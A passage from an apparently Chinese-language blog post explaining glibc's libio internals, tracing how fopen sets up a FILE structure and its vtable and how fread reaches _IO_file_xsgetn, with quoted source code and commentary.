class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">  oflags |= O_CLOEXEC;</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">/* Ignore.  */</span></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">  is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">      cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">     to wide.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      __set_errno (malloc_err);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment"> This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment"> for these.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      <span class="built_in">free</span> (ccs);</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-入参及局部变量准备"><a href="#1-入参及局部变量准备" class="headerlink" title="1.入参及局部变量准备"></a>1.入参及局部变量准备</h3><p>不多赘述，准备与 fopen 相关的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">210</span> FILE *</span><br><span class="line"><span class="number">211</span> _IO_new_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line"><span class="number">212</span>             <span class="type">int</span> is32not64)</span><br><span class="line"><span class="number">213</span> &#123;</span><br><span class="line"><span class="number">214</span>   <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line"><span class="number">215</span>   <span class="type">int</span> read_write;</span><br><span class="line"><span class="number">216</span>   <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line"><span class="number">217</span>   <span class="type">int</span> i;</span><br><span class="line"><span class="number">218</span>   FILE *result;</span><br><span class="line"><span class="number">219</span>   <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line"><span class="number">220</span>   <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br></pre></td></tr></table></figure><h3 id="2-如果文件已经打开，则返回-0"><a href="#2-如果文件已经打开，则返回-0" class="headerlink" title="2.如果文件已经打开，则返回 0"></a>2.如果文件已经打开，则返回 0</h3><p>判断方式也很简单，查看 fp 的_fileno 是否被赋值，正常打开一次之后，该值将被赋值为对应的 fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">222</span>   <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line"><span class="number">223</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">565</span> <span class="meta">#<span class="keyword">define</span> _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br></pre></td></tr></table></figure><h3 id="3-解析文件打开的-mode"><a href="#3-解析文件打开的-mode" class="headerlink" title="3.解析文件打开的 mode"></a>3.解析文件打开的 mode</h3><p>omode 记录 File access modes:只读/只写/读写</p><p>oflags 记录文件 open 的参数：</p><ul><li>O_CREAT：Create file if it doesn’t exist</li><li>O_TRUNC：Truncate file to zero length</li><li>O_APPEND：Writes append to the file</li><li>O_EXCL:Fail if file already exists</li><li>O_CLOEXEC:Set close_on_exec</li></ul><p>read_write 记录读写参数：</p><ul><li>_IO_NO_READS:Reading not allowed</li><li>_IO_NO_WRITES:Writing not allowed</li><li>_IO_IS_APPENDING:追加模式</li></ul><p>fp-&gt;_flags2 记录第二个 flags 信息：</p><ul><li>_IO_FLAGS2_MMAP：使用 mmap</li><li>_IO_FLAGS2_NOTCANCEL:不取消模式</li><li>_IO_FLAGS2_CLOEXEC:lose_on_exec</li></ul><p>last_recognized 记录最后检测到的模式。</p><h3 id="4-调用-IO-file-open-打开文件"><a href="#4-调用-IO-file-open-打开文件" class="headerlink" title="4.调用_IO_file_open 打开文件"></a>4.调用_IO_file_open 打开文件</h3><p>注意，这里大部分参数都是传入的，或者刚解析出来的，这个 oprot 是前文定义的局部变量<code>int oprot = 0666</code>,表示</p><ul><li><p>该文件拥有者对该文件拥有读写的权限但是没有操作的权限</p></li><li><p>该文件拥有者所在组的其他成员对该文件拥有读写的权限但是没有操作的权限</p></li><li><p>其他用户组的成员对该文件也拥有读写权限但是没有操作的权限</p></li></ul><p>调用_IO_file_open 的流程中大致可以分为如下几步：</p><ul><li><p>根据 flags2 决定是调用__open_nocancel 还是__open；</p></li><li><p>调用_IO_mask_flags 设定对应的 flags;</p></li><li>针对 append 模式，移动文件指针到_IO_seek_end；</li><li>将打开后的 fp link 到_IO_list_all 上</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">280</span>   result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line"><span class="number">281</span>               is32not64);</span><br><span class="line"></span><br><span class="line"><span class="number">179</span> FILE *</span><br><span class="line"><span class="number">180</span> _IO_file_open (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot,</span><br><span class="line"><span class="number">181</span>            <span class="type">int</span> read_write, <span class="type">int</span> is32not64)</span><br><span class="line"><span class="number">182</span> &#123;</span><br><span class="line"><span class="number">183</span>   <span class="type">int</span> fdesc;</span><br><span class="line"><span class="number">184</span>   <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line"><span class="number">185</span>     fdesc = __open_nocancel (filename,</span><br><span class="line"><span class="number">186</span>                  posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="number">187</span>   <span class="keyword">else</span></span><br><span class="line"><span class="number">188</span>     fdesc = __open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="number">189</span>   <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">190</span>     <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">191</span>   fp-&gt;_fileno = fdesc;</span><br><span class="line"><span class="number">192</span>   _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line"><span class="number">193</span>   <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">194      update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line"><span class="number">195</span>   <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line"><span class="number">196</span>       == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line"><span class="number">197</span>     &#123;</span><br><span class="line"><span class="number">198</span>       <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line"><span class="number">199</span>       <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line"><span class="number">200</span>     &#123;</span><br><span class="line"><span class="number">201</span>       __close_nocancel (fdesc);</span><br><span class="line"><span class="number">202</span>       <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">203</span>     &#125;</span><br><span class="line"><span class="number">204</span>     &#125;</span><br><span class="line"><span class="number">205</span>   _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"><span class="number">206</span>   <span class="keyword">return</span> fp;</span><br><span class="line"><span class="number">207</span> &#125;</span><br></pre></td></tr></table></figure><p>函数的主要功能就是执行<strong>系统调用<code>open</code>打开文件</strong>，<strong>并将文件描述符赋值给FILE结构体的<code>_fileno</code>字段</strong></p><p>最后再次调用<code>_IO_link_in</code>函数，确保该结构体被链接进入<code>_IO_list_all</code>链表。</p><h3 id="5-查看打开的文件是否需要特殊转换"><a href="#5-查看打开的文件是否需要特殊转换" class="headerlink" title="5.查看打开的文件是否需要特殊转换"></a>5.查看打开的文件是否需要特殊转换</h3><p>这里主要是针对宽字符进行相关的处理和模式设置，详细的内容就不赘述了，具体细节与正常的打开流程基本一致，最后设置宽字符的字符处理虚函数表_wide_vtable。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">     cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">     to wide.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      __set_errno (malloc_err);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment"> This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment"> for these.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      <span class="built_in">free</span> (ccs);</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="0x6-fopen-maybe-mmap-函数"><a href="#0x6-fopen-maybe-mmap-函数" class="headerlink" title="0x6__fopen_maybe_mmap 函数"></a>0x6__fopen_maybe_mmap 函数</h3><p>针对 flags2 为 mmap 且 flags 设定为”r”的模式，可以直接使用 mmap 内容的方式，因为不需要修改原文件内容，所以需要替换 fp 中字符操作的虚函数表，使用 maybe_mmap 类型的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">33</span> FILE *</span><br><span class="line"><span class="number">34</span> __fopen_maybe_mmap (FILE *fp)</span><br><span class="line"><span class="number">35</span> &#123;</span><br><span class="line"><span class="number">36</span> <span class="meta">#<span class="keyword">if</span> _G_HAVE_MMAP</span></span><br><span class="line"><span class="number">37</span>   <span class="keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))</span><br><span class="line"><span class="number">38</span>     &#123;</span><br><span class="line"><span class="number">39</span>       <span class="comment">/* Since this is read-only, we might be able to mmap the contents</span></span><br><span class="line"><span class="comment">40      directly.  We delay the decision until the first read attempt by</span></span><br><span class="line"><span class="comment">41      giving it a jump table containing functions that choose mmap or</span></span><br><span class="line"><span class="comment">42      vanilla file operations and reset the jump table accordingly.  */</span></span><br><span class="line"><span class="number">43</span> </span><br><span class="line"><span class="number">44</span>       <span class="keyword">if</span> (fp-&gt;_mode &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="number">45</span>     _IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;</span><br><span class="line"><span class="number">46</span>       <span class="keyword">else</span></span><br><span class="line"><span class="number">47</span>     _IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;</span><br><span class="line"><span class="number">48</span>       fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;</span><br><span class="line"><span class="number">49</span>     &#125;</span><br><span class="line"><span class="number">50</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="number">51</span>   <span class="keyword">return</span> fp;</span><br><span class="line"><span class="number">52</span> &#125;</span><br></pre></td></tr></table></figure><hr><p>如果分配失败</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="built_in">free</span> (new_f);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>取消链接并且free chunk返回NULL</p><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><p>描述fread读取文件流的主要流程以及函数对IO FILE结构体以及结构体中的vtable的操作</p><p>这篇文章则是说在创建了文件FILE以后，fread如何实现从文件中读取数据的。</p><p>参考下流程图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/t010fa5ddb8016fb9b2.png" alt=""></p><p>整体流程为<code>fread</code>调用<code>_IO_sgetn</code>，<code>_IO_sgetn</code>调用vtable中的<code>_IO_XSGETN</code>也就是<code>_IO_file_xsgetn</code>，<code>_IO_file_xsgetn</code>是<code>fread</code>实现的核心函数。它的流程简单总结为：</p><ol><li>判断<code>fp-&gt;_IO_buf_base</code>输入缓冲区是否为空，如果为空则调用的<code>_IO_doallocbuf</code>去初始化输入缓冲区。</li><li>在分配完输入缓冲区或输入缓冲区不为空的情况下，判断输入缓冲区是否存在数据。</li><li>如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用<code>__underflow</code>函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。</li></ol><hr><p>fread实际上是<code>_IO_fread</code>函数，文件目录为<code>/libio/iofread.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);<span class="comment">//here</span></span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心是_IO_sgetn,在libio/gneops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_XSGETN是一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP,DATA,N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">......       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line">Expands to:</span><br><span class="line"></span><br><span class="line">((IO_validate_vtable ((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + __builtin_offsetof (<span class="keyword">struct</span> _IO_FILE_plus, vtable)))))-&gt;__xsgetn) (fp, data, 